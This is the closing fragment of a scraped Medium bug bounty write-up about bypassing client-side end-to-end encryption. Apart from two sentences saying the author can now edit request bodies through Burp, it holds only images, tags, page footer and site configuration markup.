https://miro.medium.com/v2/resize:fit:828/format:webp/1*P1Wq3qFA_eSuiZzC7zWyWg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*P1Wq3qFA_eSuiZzC7zWyWg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P1Wq3qFA_eSuiZzC7zWyWg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*P1Wq3qFA_eSuiZzC7zWyWg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*P1Wq3qFA_eSuiZzC7zWyWg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*P1Wq3qFA_eSuiZzC7zWyWg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*P1Wq3qFA_eSuiZzC7zWyWg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*P1Wq3qFA_eSuiZzC7zWyWg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*P1Wq3qFA_eSuiZzC7zWyWg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*P1Wq3qFA_eSuiZzC7zWyWg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="125" loading="lazy" role="presentation"/></picture></div></div></figure><p id="60a7" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">That&#x27;s it! I saved the file, refreshed the page, and invoked any request to the API</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Fq7LVrtbh4sRS4tzbdKe_g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Fq7LVrtbh4sRS4tzbdKe_g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Fq7LVrtbh4sRS4tzbdKe_g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Fq7LVrtbh4sRS4tzbdKe_g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Fq7LVrtbh4sRS4tzbdKe_g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Fq7LVrtbh4sRS4tzbdKe_g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Fq7LVrtbh4sRS4tzbdKe_g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Fq7LVrtbh4sRS4tzbdKe_g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Fq7LVrtbh4sRS4tzbdKe_g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Fq7LVrtbh4sRS4tzbdKe_g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Fq7LVrtbh4sRS4tzbdKe_g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Fq7LVrtbh4sRS4tzbdKe_g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Fq7LVrtbh4sRS4tzbdKe_g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Fq7LVrtbh4sRS4tzbdKe_g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="308" loading="lazy" role="presentation"/></picture></div></div></figure><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe qq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wyLU0kqRTJSWMMIQCQooUg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*wyLU0kqRTJSWMMIQCQooUg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*wyLU0kqRTJSWMMIQCQooUg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*wyLU0kqRTJSWMMIQCQooUg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*wyLU0kqRTJSWMMIQCQooUg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*wyLU0kqRTJSWMMIQCQooUg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wyLU0kqRTJSWMMIQCQooUg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*wyLU0kqRTJSWMMIQCQooUg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*wyLU0kqRTJSWMMIQCQooUg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*wyLU0kqRTJSWMMIQCQooUg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*wyLU0kqRTJSWMMIQCQooUg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*wyLU0kqRTJSWMMIQCQooUg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*wyLU0kqRTJSWMMIQCQooUg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*wyLU0kqRTJSWMMIQCQooUg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="330" loading="lazy" role="presentation"/></picture></div></div></figure><p id="5d82" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Now I control any request body sent to the application just by editing it via burp.</p><p id="8414" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">That’s all for this blog, I hope you enjoyed reading and I will be pleased if you have any <a class="af pl" href="https://twitter.com/melotover" rel="noopener ugc nofollow" target="_blank">feedback</a>!</p></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="qr qs ab iv"><div class="qt ab"><a class="qu ay am ao" href="https://medium.com/tag/javascript-obfuscate?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><div class="qv fj cx qw ge qx qy bf b bg z bk qz">Javascript Obfuscate</div></a></div><div class="qt ab"><a class="qu ay am ao" href="https://medium.com/tag/bugbounty-writeup?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><div class="qv fj cx qw ge qx qy bf b bg z bk qz">Bugbounty Writeup</div></a></div><div class="qt ab"><a class="qu ay am ao" href="https://medium.com/tag/ssrf?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><div class="qv fj cx qw ge qx qy bf b bg z bk qz">Ssrf</div></a></div><div class="qt ab"><a class="qu ay am ao" href="https://medium.com/tag/idor?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><div class="qv fj cx qw ge qx qy bf b bg z bk qz">Idor</div></a></div><div class="qt ab"><a class="qu ay am ao" href="https://medium.com/tag/encryption-security?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><div class="qv fj cx qw ge qx qy bf b bg z bk qz">Encryption Security</div></a></div></div></div></div><div class="l"></div><footer class="ra rb rc rd re ab q rf rg c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp rh"><div class="ab q ke"><div class="ri l"><span class="l rj rk rl e d"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F65b708e5ad84&amp;operation=register&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;user=Asem+Eleraky&amp;userId=d906f948337c&amp;source=---footer_actions--65b708e5ad84---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span><span class="l h g f rm rn"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F65b708e5ad84&amp;operation=register&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;user=Asem+Eleraky&amp;userId=d906f948337c&amp;source=---footer_actions--65b708e5ad84---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao kk lc ld ab q fk le lf" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lb"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bf b bg z du"><span class="pw-responses-count la lb">10</span></p></button></div></div></div></div><div class="ab q"><div class="pj l is"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F65b708e5ad84&amp;operation=register&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;source=---footer_actions--65b708e5ad84---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lh" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="pj l is"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al lp an ao ap ex lq lr lf ls"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></footer><div class="ro l"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab rp rq rr iu it"><div class="rs rt ru rv rw rx ry rz sa sb ab cp"><div class="h k"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--65b708e5ad84--------------------------------"><div class="l fj"><img alt="Asem Eleraky" class="l fd by ic ib cx" src="https://miro.medium.com/v2/resize:fill:96:96/1*-oVXJ2PJ5gd_HMA4MY1aPw.jpeg" width="48" height="48" loading="lazy"/><div class="fr by l ic ib fs n ay sc"></div></div></a></div><div class="j i d"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--65b708e5ad84--------------------------------"><div class="l fj"><img alt="Asem Eleraky" class="l fd by sd se cx" src="https://miro.medium.com/v2/resize:fill:128:128/1*-oVXJ2PJ5gd_HMA4MY1aPw.jpeg" width="64" height="64" loading="lazy"/><div class="fr by l sd se fs n ay sc"></div></div></a></div><div class="j i d sf is"><div class="ab"><span><button class="bf b bg z sg qv sh si sj sk sl ev ew sm sn so fa fb fc fd bm fe ff">Follow</button></span></div></div></div><div class="ab co sp"><div class="sq sr ss st su l"><a class="af ag ah aj ak al am an ao ap aq ar as at ab q" rel="noopener follow" href="/?source=post_page---post_author_info--65b708e5ad84--------------------------------"><h2 class="pw-author-name bf sw sx sy sz ta tb tc ms np nq mw ns nt na nv nw bk"><span class="gn sv">Written by <!-- -->Asem Eleraky</span></h2></a><div class="qt ab ia"><div class="l is"><span class="pw-follower-count bf b bg z du"><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/followers?source=post_page---post_author_info--65b708e5ad84--------------------------------">857 Followers</a></span></div><div class="bf b bg z du ab td"><span class="im l" aria-hidden="true"><span class="bf b bg z du">·</span></span><a class="af ag ah ai aj ak al am an ao ap aq ar il" rel="noopener follow" href="/following?source=post_page---post_author_info--65b708e5ad84--------------------------------">8 Following</a></div></div><div class="te l"><p class="bf b bg z bk"><span class="gn">Penetration Tester, CTF Challenges Developer &amp; Player, Bug Hunter | AKA @Melotover</span></p></div></div></div><div class="h k"><div class="ab"><span><button class="bf b bg z sg qv sh si sj sk sl ev ew sm sn so fa fb fc fd bm fe ff">Follow</button></span></div></div></div></div></div></div><div class="tf tg th ti tj l"><div class="tk bh r ro"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab q cp"><h2 class="bf sw tl tm nk tn to nn tp tq tr ts tt tu tv tw tx bk">Responses (<!-- -->10<!-- -->)</h2><div class="ab ty"><div><div class="bm" aria-hidden="false"><a class="tz ua" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--65b708e5ad84--------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div><div class="ub uc ud ue uf ug uh l"></div><div class="pc l"><button class="bf b bg z bk qv ui uj uk lh le sl ev ew ex ul um un fa uo up uq ur us fb fc fd bm fe ff">See all responses</button></div></div></div></div><div class="ut uu uv uw ux l bx"><div class="h k j"><div class="tk bh uy uz"></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="va ab ke iv"><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://help.medium.com/hc/en-us?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Help</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.statuspage.io/?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Status</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/about?autoplay=1&amp;source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">About</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Careers</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="pressinquiries@medium.com?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Press</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://blog.medium.com/?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Blog</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="vb vc l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="vb l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/business?source=post_page-----65b708e5ad84--------------------------------" rel="noopener follow"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250110-154215-d58a2d1ab2"</script><script>window.__GRAPHQL_URI__ = "https://melotover.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-65b708e5ad84","user-d906f948337c"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"USER","id":"d906f948337c","explicit":true},"viewerIsBot":false},"debug":{"requestId":"9970786e-2dba-46e0-9ea2-14592713d663","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-b1c300d6ac517a970e0c45a22a18066e-5c0cd8126613d091-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fmelotover.medium.com\u002Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84","host":"melotover.medium.com","hostname":"melotover.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20250110-154215-d58a2d1ab2","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-